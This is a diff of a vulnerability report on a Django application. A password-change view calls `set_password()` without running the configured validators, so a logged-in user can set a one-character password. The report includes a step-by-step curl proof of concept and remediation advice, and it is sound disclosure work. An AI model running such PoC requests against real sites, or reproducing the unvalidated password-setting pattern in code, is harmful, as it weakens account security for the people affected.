@@ -22,7 +22,7 @@ Weak password requirements (CWE-521) in the password-change flow of `POST /accou
 
 **Inconsistency**
 
-The same account can hold a password that would be rejected by the signup and reset flows. Django's `AUTH_PASSWORD_VALIDATORS` (`djangoWocshack_5/settings/base.py:112-117`) is configured, but `set_password()` does not run those validators. Only form-level validation runs them, and this view does not use a form. The policy is therefore enforced on two of the three paths that set a password, and bypassed on the third. An attacker who is logged in can use the bypass to weaken their own account, which makes the account easier to brute-force.
+The same account can hold a password that would be rejected by the signup and reset flows. Django's `AUTH_PASSWORD_VALIDATORS` (`djangoWocshack_5/settings/base.py:112-117`) is configured, but `set_password()` does not run those validators. Django's password validators are not automatically enforced by `set_password()`. Custom password-setting workflows must explicitly call `validate_password()` or use Django's built-in password validation forms. The policy is therefore enforced on two of the three paths that set a password, and bypassed on the third. An attacker who is logged in can use the bypass to weaken their own account, which makes the account easier to brute-force.
 
 # Exploitation
 
@@ -30,8 +30,8 @@ The same account can hold a password that would be rejected by the signup and re
 |------|--------|--------|
 | 1 | Log in as a normal user (for example `johndoe`) with a password that meets the policy. | Authenticated session. |
 | 2 | Open `/account/settings/` and load the CSRF token from the page. | The form includes `csrfmiddlewaretoken`. |
-| 3 | POST the password-change form with `old_password` set to the current password and `new_password` = `confirm_password` = `a`. | Server returns HTTP 302 and the flash message "Password updated successfully." No strength check runs. |
-| 4 | Log out, then log in as the same user with `username=johndoe` and `password=a`. | Login succeeds. The account now has a one-character password. |
+| 3 | POST the password-change form with `old_password` set to the current password and `new_password` = `confirm_password` = `a`. | Server returns HTTP 302 to `/account/settings/` and queues the message "Password updated successfully." No strength check runs. Because `update_session_auth_hash()` is called with the stale `request.user` instead of `target_user`, the current session is invalidated: the next request is redirected to `/account/login/?next=/account/settings/`. |
+| 4 | Log in again as the same user with `username=johndoe` and `password=a`. | Login succeeds (HTTP 302 to `/account/process/`). The account now has a one-character password. |
 
 # PoC
 
@@ -59,16 +59,16 @@ curl -s -c jar.txt -b jar.txt -X POST "$BASE/account/settings/" \
   --data-urlencode "old_password=$OLD" \
   --data-urlencode "new_password=a" \
   --data-urlencode "confirm_password=a" \
-  -o /dev/null -w "%{http_code}\n"
-# -> 302 (password changed)
+  -o /dev/null -w "%{http_code} %{redirect_url}\n"
+# -> 302 .../account/settings/ (password changed; this session is now invalidated)
 
 # 4. Verify: log in with the one-character password
-curl -s -D - -o /dev/null -b /dev/null -c /dev/null -X POST "$BASE/account/login/" \
+curl -s -D - -o /dev/null -b j2.txt -c j2.txt -X POST "$BASE/account/login/" \
   -H "Referer: $BASE/account/login/" \
   --data-urlencode "csrfmiddlewaretoken=$(curl -s -c j2.txt -b j2.txt $BASE/account/login/ | grep -oP 'csrfmiddlewaretoken" value="\K[^"]+' | head -1)" \
   --data-urlencode "username=$USER" \
   --data-urlencode "password=a" | grep -i '^HTTP\|^Location'
-# -> HTTP/1.1 302 Found, Location: /  (login succeeded with "a")
+# -> HTTP/1.1 302 Found, Location: /account/process/  (login succeeded with "a")
 ```
 
 The same request sent to `/account/register/` with a weak password returns the error "Password is not strong enough." The contrast shows the policy is applied in one place and not in the other.
@@ -85,9 +85,12 @@ Overall severity: **Medium** — the flaw needs an authenticated session and onl
 
 # Remediation
 
-1. Call `check_password_strength(new)` in the `settings()` password-change branch, before `set_password()`, and return an error if it fails. Example: `if check_password_strength(new) is not True: messages.error(request, "Password is not strong enough."); else: ...`.
-2. Run Django's `validate_password(new, user=target_user)` in the same branch. This applies the existing `AUTH_PASSWORD_VALIDATORS` (`djangoWocshack_5/settings/base.py:112-117`) to every password change.
-3. Move the policy into one place (a shared helper or a form) that all password-setting paths call: signup, reset, and settings. Add a test that changing a password to `a` through `/account/settings/` is rejected.
+1. **Enforce password validation during password changes** — update the password-change branch of `settings()` in `Account/views.py` to call `django.contrib.auth.password_validation.validate_password(new, user=target_user)` before `set_password()`. Catch `django.core.exceptions.ValidationError`, return the validation errors and prevent any password update if validation fails.
+2. **Centralise password requirements** — use the existing `AUTH_PASSWORD_VALIDATORS` configuration in `djangoWocshack_5/settings/base.py` as the single source of truth. Integrate or replace `check_password_strength()` in `Account/Utils/Register.py` to eliminate inconsistent password policies.
+3. **Apply validation consistently** — ensure that `register()`, `password_reset()` and `settings()` use the same server-side password validation mechanism. Prefer Django's built-in `PasswordChangeForm` where compatible with the existing settings workflow.
+4. **Strengthen the existing password policy** — review `MinimumLengthValidator` and configure its `OPTIONS.min_length` according to NIST SP 800-63B-4 recommendations. Maintain an appropriate blocklist of common and compromised passwords rather than relying on mandatory character composition rules.
+5. **Preserve authentication and session security** — retain current-password verification, password confirmation and CSRF protection. Use `update_session_auth_hash()` after a successful password change if the current authenticated session must remain active.
+6. **Add regression tests** — extend `Account/tests.py` to verify consistent password validation across registration, password reset and password change. Ensure that rejected passwords do not modify stored credentials and that valid passwords are accepted.
 
 # Author
 WOCSA
